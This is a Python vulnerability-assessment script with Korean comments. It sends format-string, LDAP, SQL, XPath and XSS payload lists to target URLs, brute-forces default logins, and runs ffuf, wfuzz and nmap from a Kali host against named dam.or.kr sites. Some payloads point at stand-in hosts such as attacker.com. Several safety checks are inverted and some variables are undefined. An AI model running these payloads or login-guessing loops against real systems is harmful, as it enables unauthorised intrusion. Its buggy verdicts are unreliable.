import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from util.Static_util import util
from vo.Host import Host
from vo.Info import Info
import datetime
import requests
import difflib

# 테스트할 URL과 파라미터 이름 설정
url = "http://172.16.8.200:80"
param_name = "input"

kali_host = Host(999, "linux", "kali", "<KALI_IP>", "root", "<KALI_PASSWORD>")

def session_SE(url="http://jm.dam.or.kr/"):
    ls = []
    for i in range(20):
        r = requests.get(url)
        sid = r.cookies.get_dict().get("PHPSESSID", "NoSessionID")
        ls.append(sid)
    return ls

def check_SF(url="http://dvwa.dam.or.kr:81/login.php"):
    payload = {"username": "admin", "password": "password", "Login": "Login"}
    session = requests.Session()

    session.get(url)
    sid_before = session.cookies.get("PHPSESSID", "NoSessionID")

    session.post(url, data=payload)
    sid_after = session.cookies.get("PHPSESSID", "NoSessionID")
    return sid_before, sid_after

class Web:
    ###########################################################################
    # 취약점 테스트용 포맷 스트링 패턴들
    def FS():
        payloads = [
            "%n%n%n%n%n%n%n%n%n%n",
            "%s%s%s%s%s%s%s%s%s%s",
            "%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n!",
            "%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s!"
        ]
        
        # 각 페이로드를 입력하여 응답 확인
        for payload in payloads:
            print("[*] Testing payload:", payload)
            response = requests.get(url, params={param_name: payload})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))
        
            # 응답 내용 중 에러 패턴이 있는지 검사
            if "error" in response.text.lower() or "exception" in response.text.lower() or "printf" in response.text.lower():
                print("[!] Possible vulnerability or error message detected")
                is_safe = True
            else:
                is_safe = False  
            print("------------------------------------------------")
        #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
        score = 3
        #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        #print(date)
        info = Info(id,date,payload,"FS",response.text,is_safe,score)
        #5. 정보 객체 반환
        return info
    ###########################################################################
    def LI():
        payloads = [
            "*",
            "*)(&",
            "*))%00",
            ")(cn=))\x00",
            "*()|%26'",
            "*()|&'",
            "*(|(mail=*))",
            "*(|(objectclass=*))",
            "*)(uid=*))(|(uid=*",
            "*/*",
            "*|",
            "/",
            "//",
            "//*",
            "@*",
            "|",
            "admin*",
            "admin*)((|userpassword=*)",
            "admin*)((|userPassword=*)",
            "x' or name()='username' or 'x '='y"
        ]

        for payload in payloads:
            print("[*] Testing LDAP payload:", payload)
            response = requests.get(url, params={param_name: payload})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

            # 응답에서 LDAP 인젝션 시 흔한 패턴 탐지
            if any(err in response.text.lower() for err in ["ldap", "filter", "dn", "exception", "error"]):
                print("[!] Possible LDAP Injection or error message detected")
                is_safe = True
            else:
                is_safe = False
            print("------------------------------------------------")
        #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
        score = 3
        #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        #print(date)
        info = Info(id,date,payload,"LI",response.text,is_safe,score)
        #5. 정보 객체 반환
        return info
    ##################################################################################################3
    def SI():
        # Step 1: 에러 유도
        error_payloads = [
            "'",
            "\"",
            "'--",
            "\"--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "' OR 'a'='a",
            "1')",
            "1' or '1'='1' --",
            "1 or updatexml(1,concat(0x7e,(select version())),0)",
            "'||(SELECT 1 FROM dual)||'"
        ]

        print("[*] Step 1: SQL Error Test\n")
        for payload in error_payloads:
            print("[*] Testing payload:", payload)
            response = requests.get(url, params={param_name: payload})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

        error_keywords = ["sql", "syntax", "query", "mysql", "psql", "sqlite", "error", "exception", "odbc"]
        if any(k in response.text.lower() for k in error_keywords):
            print("[!] Possible SQL Injection or DB error message detected")
            is_safe = True
        else:
            is_safe = False
            #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
            score = 3
            #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
            date = datetime.datetime.now().strftime("%Y-%m-%d")
            #print(date)
            info = Info(id,date,payload,"SI",response.text,is_safe,score)
            #5. 정보 객체 반환
            return info
        print("------------------------------------------------")

        # Step 2: 논리 참/거짓 비교
        print("[*] Step 2: Boolean-based Test\n")
        true_payload = "' AND 1=1 --"
        false_payload = "' AND 1=2 --"

        response_true = requests.get(url, params={param_name: true_payload})
        response_false = requests.get(url, params={param_name: false_payload})

        print("TRUE Response Length:", len(response_true.text))
        print("FALSE Response Length:", len(response_false.text))

        if len(response_true.text) != len(response_false.text):
            print("[!] Possible Blind SQL Injection (boolean-based)")
            is_safe = True
        else:
            is_safe = False
            #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
            score = 3
            #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
                # date(날짜 정보) 생성
            date = datetime.datetime.now().strftime("%Y-%m-%d")
            #print(date)
            info = Info(id,date,payload,"SI",response.text,is_safe,score)
            #5. 정보 객체 반환
            return info
        print("------------------------------------------------")

        # Step 3: 로그인 우회 (기초 예시)
        print("[*] Step 3: Login Bypass Attempt\n")
        test_payloads = [
            "' OR '1'='1' --",
            "' OR 1=1#",
            "' OR 'a'='a' --",
            "' or 1=1 limit 1 --"
        ]

        for payload in test_payloads:
            print("[*] Testing login bypass payload:", payload)
            response = requests.post(url + "/login", data={"username": payload, "password": "test"})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))
            
        success_keywords = ["welcome", "dashboard", "logout"]
        if any(k in response.text.lower() for k in success_keywords):
            print("[!] Possible Login Bypass with SQL Injection")
            is_safe = True
        else:
            is_safe = False
        print("------------------------------------------------")
        #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
        score = 3
        #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        #print(date)
        info = Info(id,date,payload,"SI",response.text,is_safe,score)
        #5. 정보 객체 반환
        return info
    #######################################################################################################3
    def XI():
        Is_safe = False
        # Step 1: 참/거짓 쿼리 조작 시도
        payloads_true_false = [
            "' and 'a'='a",
            "' and 'a'='b",
            " and 1=1",
            " and 1=2"
        ]

        print("[*] Step 1: Boolean-based XPath Injection Test\n")
        print("----------------------------------------------")
        for payload in payloads_true_false:
            print("[*] Testing XPath payload:", payload)
            response = requests.get(url, params={param_name: payload})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

            # 여기는 비교용 응답 길이 판단에 기반해 수동 비교 가능
            # 또는 자동 비교 구현하려면 아래처럼 비교
            # (예시) 두 번째 요청에서 차이 생기면 의심
            # → 여기선 단순 출력만
            print("------------------------------------------------")

        # Step 2: XPath 특수 표현식 테스트
        payloads_xpath_funcs = [
            "' or count(parent::*[position()=1])=0 or 'a'='b",
            "' or count(parent::*[position()=1])>0 or 'a'='b",
            "1 or count(parent::*[position()=1])=0",
            "1 or count(parent::*[position()=1])>0"
        ]

        print("[*] Step 2: XPath Expression Error Test\n")
        for payload in payloads_xpath_funcs:
            print("[*] Testing XPath function payload:", payload)
            response = requests.get(url, params={param_name: payload})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

            xpath_errors = [
                "xpath", "invalid", "unexpected", "syntax", "error",
                "unterminated", "exception", "query", "path", "node", "element"
            ]
            if any(k in response.text.lower() for k in xpath_errors):
                print("[!] Possible XPath Injection or error message detected")
                is_safe = True
                print("------------------------------------------------")
        
        #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
        score = 3
        #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        #print(date)
        info = Info(id,date,payload,"XI",response.text,is_safe,score)
        #5. 정보 객체 반환
        return info
    ########################################################################################
    def CS():
        is_safe = False
        # Step 1: 콘텐츠 삽입 및 업로드 우회 시도 (스크립트 삽입)
        payloads = [
            "<script>alert('x')</script>",
            "<img src=x onerror=alert('x')>",
            "<iframe src='http://attacker.com'></iframe>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<a href='http://malicious.com'>Click</a>",
            "<video><source onerror='alert(1)'></video>",
            "<object data='evil.swf'></object>",
            "<link rel='stylesheet' href='http://attacker.com/x.css'>"
        ]

        print("[*] Step 1: 콘텐츠 삽입 필터링 우회 테스트")
        for payload in payloads:
            print("[*] Testing content payload:", payload)
            response = requests.get(url, params={param_name: payload})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

            indicators = [
                "<script", "onerror", "onload", "<iframe", "<svg", "object", "embed", "video", "source", "link", "malicious", "attacker"
            ]
            if any(k in response.text.lower() for k in indicators):
                print("[!] Possible content injection or filter bypass detected")
                is_safe = True
            else:
                is_safe = False
                #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
                score = 3
                #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
                    # date(날짜 정보) 생성
                date = datetime.datetime.now().strftime("%Y-%m-%d")
                #print(date)
                info = Info(id,date,payload,"CS",response.text,is_safe,score)
                #5. 정보 객체 반환
                return info
            print("------------------------------------------------")

        # Step 2: 악성 자동 다운로드/리디렉션 확인
        download_payloads = [
            "http://malicious.com/malware.exe",
            "http://attacker.com/download.html",
            "data:application/x-msdownload;base64,...",
            "<meta http-equiv='refresh' content='0;url=http://malicious.com'>"
        ]

        print("[*] Step 2: 악의적 콘텐츠 실행 또는 리디렉션 테스트")
        for payload in download_payloads:
            print("[*] Testing download/redirection payload:", payload)
            response = requests.get(url, params={param_name: payload})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

            if any(k in response.text.lower() for k in ["download", "exe", "href=", "refresh", "http-equiv", "location", "data:"]):
                print("[!] Possible forced download or redirection detected")
                is_safe = True
            else:
                is_safe = False
            print("------------------------------------------------")
        #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
        score = 3
        #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        #print(date)
        info = Info(id,date,payload,"CS",response.text,is_safe,score)
        #5. 정보 객체 반환
        return info
    ###############################################################################333
    def XS():
        is_safe = False
        payloads = [
            "<script>alert(1)</script>",
            "<img src='javascript:alert(1)'>",
            "<div style=\"background-image:url(javascript:alert(1))\"></div>",
            "<embed src='data:image/svg+xml;base64,...'>",
            "<iframe src='http://attacker.com'></iframe>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<IMG SRC=JaVaScRiPt:alert(1)>",
            "<IMG SRC=Jav&#97;script:alert(1)>",
            "<IMG SRC=Java&#13;script:alert(1)>",
            "<IMG SRC=Java&#0013;script:alert(1)>"
        ]

        print("[*] Step 1: XSS Payload 테스트")
        for payload in payloads:
            print("[*] Testing XSS payload:", payload)
            response = requests.get(url, params={param_name: payload})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

            # 응답 내 XSS 관련 키워드 탐지
            xss_keywords = [
                "<script", "javascript:", "onerror", "onload", "iframe", "embed", "svg", "alert", "%3cscript", "&#"
            ]
            if any(k in response.text.lower() for k in xss_keywords):
                print("[!] Possible XSS vulnerability detected")
                is_safe = True
            print("------------------------------------------------")
        #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
        score = 3
        #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        #print(date)
        info = Info(id,date,payload,"XS",response.text,is_safe,score)
        #5. 정보 객체 반환
        return info
    ##########################################################################################3
    def BF():
        usernames = [
            "admin", "administrator", "manager", "guest", "test",
            "scott", "tomcat", "root", "user", "operator", "anonymous"
        ]

        passwords = [
            "Abcd", "aaaa", "1234", "1111", "test", "password", "public", "",  # blank는 빈 문자열
        ]

        print("[*] Step 1: 추측 가능한 계정/비밀번호 조합 테스트")
        for username in usernames:
            for password in passwords + [username]:  # ID와 동일한 패스워드도 포함
                print("[*] Trying ID:", username, "/ PW:", password)
                response = requests.post(url, data={"username": username, "password": password})
                print("Status Code:", response.status_code)
                print("Response Length:", len(response.text))

                success_keywords = ["welcome", "dashboard", "logout", "환영", "메인화면"]
                if any(k in response.text.lower() for k in success_keywords):
                    print("[!] Possible weak credentials accepted")
                    is_safe= False
                    #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
                    score = 3
                    #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
                        # date(날짜 정보) 생성
                    date = datetime.datetime.now().strftime("%Y-%m-%d")
                    #print(date)
                    info = Info(id,date,"BruteForce User/PW Check","BF",response.text,is_safe,score)
                    #5. 정보 객체 반환
                    return info
                print("------------------------------------------------")

        print("[*] Step 2: 로그인 시도 횟수 제한 테스트")
        test_id = "testuser"
        test_pw = "wrongpassword"

        for i in range(6):
            print("[*] Attempt", i + 1, "with ID:", test_id)
            response = requests.post(url, data={"username": test_id, "password": test_pw})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

            block_keywords = ["too many", "잠김", "차단", "limit", "locked", "fail", "block"]
            if any(k in response.text.lower() for k in block_keywords):
                print("[!] Login blocking or rate limiting detected after", i + 1, "attempts")
                is_safe = True
                break
            else:
                is_safe = False
            print("------------------------------------------------")
        #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
        score = 3
        #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        #print(date)
        info = Info(id,date,"BruteForce User/PW Check","BF",response.text,is_safe,score)
        #5. 정보 객체 반환
        return info
    ##################################################################################################
    def PR():
        is_safe = True
        # 테스트용 사용자 계정 리스트 (추측 가능한 계정 기반)
        test_users = [
            "admin", "user1", "testuser", "guest", "manager"
        ]

        print("[*] Step 1: 패스워드 복구 절차 테스트")
        for user in test_users:
            print("[*] Requesting password reset for:", user)
            response = requests.post(url, data={"username": user})
            print("Status Code:", response.status_code)
            print("Response Length:", len(response.text))

            # 예상 가능한 패턴 포함 여부 확인
            weak_patterns = [
                "1234", "abcd", "user", "test", "0000", "password",
                "연락처", "전화", "이메일", "메일", "주소", "생일", "birth"
            ]

            if any(k in response.text.lower() for k in weak_patterns):
                print("[!] Possible use of weak or guessable password patterns")
                is_safe = False
                #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
                score = 3
                #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
                    # date(날짜 정보) 생성
                date = datetime.datetime.now().strftime("%Y-%m-%d")
                #print(date)
                info = Info(id,date,"password check","PR",response.text,is_safe,score)
                #5. 정보 객체 반환
                return info
            # 메일이나 SMS 전송 여부 판단 (응답 내 키워드 기반)
            delivery_indicators = [
                "메일로 전송", "이메일 발송", "sms 발송", "문자 전송", "email sent", "check your inbox"
            ]

            if any(k in response.text.lower() for k in delivery_indicators):
                print("[+] Password reset sent to verified contact")
                is_safe = False
            else:
                print("[!] No indication of secure delivery method (email/SMS)")
                is_safe = True
                
            print("------------------------------------------------")
        #3. 정보값을 바탕으로 지키고 있는지 안 지키고 있는지 판단한다. -> 지켰으면 is_safe, score 값을 바꿔준다.
        score = 3
        #4. 정보 객체 생성 - 날짜, 호스트, 영역, 점검코드, 결과/ 점수(중요도)
            # date(날짜 정보) 생성
        date = datetime.datetime.now().strftime("%Y-%m-%d")
        #print(date)
        info = Info(id,date,"password check","PR",response.text,is_safe,score)
        #5. 정보 객체 반환
        return info
    ##################################################################################################################################

    def SE(self, host):
        sids = session_SE()
        similar_count, total = 0, 0
        for i in range(len(sids)):
            for j in range(i + 1, len(sids)):
                total += 1
                ratio = difflib.SequenceMatcher(None, sids[i], sids[j]).ratio()
                if ratio > 0.8:
                    similar_count += 1

        # 50% 이상 유사하면 취약
        is_safe = (similar_count / total) < 0.5
        score = 3
        result = f"{similar_count / total} 세션 ID 유사 수치"
        return Info(0, datetime.datetime.now().strftime("%Y-%m-%d"), "SE", "session_SE(script)", result, is_safe, score)

    def SC(self, host):
        if "ubuntu" in host.category:
            cmd = [
                'grep -i timeout /etc/apache2/apache2.conf',
                'grep -i timeout -R /etc/apache2/sites-available/*'
            ]
        else:
            cmd = [
                'grep -i timeout -R /etc/httpd/conf/*',
                'grep -i timeout -R /etc/httpd/conf.d/*'
            ]
        result = ""
        for cmd in cmd:
            result += util.para_connect(host, cmd, 10)

        result_lower = result.lower()
        is_safe = any(i.isdigit() for i in result)
        score = 3
        return Info(host.id, datetime.datetime.now().strftime("%Y-%m-%d"), "SC", cmd[0], result, is_safe, score)

    def SF(self, host):
        (sid_before, sid_after) = check_SF()
        sessions += sid_before
        sessions += sid_after
        is_safe = sid_before != sid_after
        score = 3
        result = "\n".join(sessions)
        return Info(host.id, datetime.datetime.now().strftime("%Y-%m-%d"), "SF", "check_SF(script)", result, is_safe, score)

    def AU(self, host):
        cmd = "cat /var/log/auth.log | grep 'Failed password' | tail -n 10"
        result = util.para_connect(host, cmd, 10)
        is_safe = not ("Failed password" in result and "captcha" not in result.lower())
        score = 3
        return Info(host.id, datetime.datetime.now().strftime("%Y-%m-%d"), "AU", cmd, result, is_safe, score)

    def FU(self, host):
        cmd = "grep -R 'upload' /var/www/html"
        result = util.para_connect(host, cmd, 10)
        is_safe = "upload_success" not in result.lower()
        score = 3
        return Info(host.id, datetime.datetime.now().strftime("%Y-%m-%d"), "FU", cmd, result, is_safe, score)

    def FD(self, host):
        url = 'http://www.dam.or.kr'
        cmd1 = f"ffuf -w /usr/share/wordlists/dirb/common.txt -u {url}/FUZZ -e .php,.asp,.jsp,.cgi | grep -i 'status: 200' 2>/dev/null"
        cmd2 = f"wfuzz -z file,/usr/share/wfuzz/wordlist/Injections/Traversal.txt -u '{url}/download?file=FUZZ' 2>/dev/null"
        result1 = util.para_connect(kali_host, cmd1, 60)
        result2 = util.para_connect(kali_host, cmd2, 30)
        is_safe = not (("status: 200" not in result1.lower()) or ("200" not in result2.lower()))
        score = 3
        return Info(host.id, datetime.datetime.now().strftime("%Y-%m-%d"), "FD", cmd, result, is_safe, score)

    def AE(self, host):
        url = 'http://wp.dam.or.kr'
        admin_url = 'http://wp.dam.or.kr/wp-admin'
        
        cmd1 = f'ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u {url}/FUZZ/ -c -fc 404 2>/dev/null'
        cmd2 = f'nmap -p 7001,8080,8443,8888 {url} 2>/dev/null'
        cmd3 = f'ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u {admin_url}/FUZZ/ -c 2>/dev/null'
        cmd4 = f'curl -i {admin_url}/secret | grep status 2>/dev/null'

        result1 = util.para_connect(kali_host, cmd1, 10)
        result2 = util.para_connect(kali_host, cmd2, 10)
        result3 = util.para_connect(kali_host, cmd3, 10)
        result4 = util.para_connect(kali_host, cmd4, 10)
        vuln_ffuf = ("admin" in result1 or "root" in result1 or "admin" in result3 or "root" in result3)
        vuln_nmap = any(p in result2 for p in ['7001', '8080', '8443', '8888'])
        vuln_curl = "200" in result4
        is_safe = not (vuln_ffuf or vuln_nmap or vuln_curl)
        score = 3
        return Info(host.id, datetime.datetime.now().strftime("%Y-%m-%d"), "AE", cmd, result, is_safe, score)

    def PL(self, host):
        web_dir = '/var/www/html/'
        cmd1 = f'find {web_dir} \( -name "*.bak" -o -name "*.backup" -o -name "*.org" -o -name "*.old" -o -name "*.zip" -o -name "*.log" -o -name "*.sql" -o -name "*.new" -o -name "*.txt" -o -name "*.tmp" -o -name "*.temp" \) 2>/dev/null'
        cmd2 = f'find {web_dir} \( -type d \( -iname "cgi-bin" -o -iname "manual" -o -iname "usage" -o -iname "iissamples" -o -iname "scripts" -o -iname "iisHelp" -o -iname "IISAdmin" -o -iname "_vit_bin" -o -iname "Printers" -o -iname "examples" -o -iname "jsp" -o -iname "servlets" \) -o -type f \( -iname "phpinfo.php" \) \) 2>/dev/null'
        result1 = util.para_connect(host, cmd1, 10)
        result2 = util.para_connect(host, cmd2, 10)
        is_safe = (result1.strip() == "" or result2.strip() == "" )
        score = 3
        return Info(host.id, datetime.datetime.now().strftime("%Y-%m-%d"), "PL", cmd, result1, is_safe, score)

    def CC(self, host):
        cmd1 = "curl -I -s http://jm.dam.or.kr/ | egrep 'HttpOnly|Secure|SameSite'"
        cmd2 = "curl -s -I -c - http://jm.dam.or.kr | grep -i set-cookie | awk '{print $2}'"
        if "ubuntu" in host.category:
            cmd = "grep '^session' /etc/php.ini | grep cookie"
        else:
            cmd = "grep '^session' /etc/php/8.4/cli/php.ini | grep cookie"

        result = util.para_connect(host, cmd, 10)
        is_safe = all(x in result for x in ["HttpOnly", "Secure", "SameSite"])
        score = 3
        return Info(host.id, datetime.datetime.now().strftime("%Y-%m-%d"), "CC", cmd, result, is_safe, score)


web = Web()


# Test
# 상황에 맞게 값 수정 가능
#hosta = Host(1,"unix","rocky9","172.16.8.200","root","asd123!@")

#info = Web.PR()
#print(vars(info))

#Web.FS()
#Web.LI()
#Web.SI()
#Web.XI()
#Web.CS()
#Web.XS()
#Web.BF()
#Web.PR()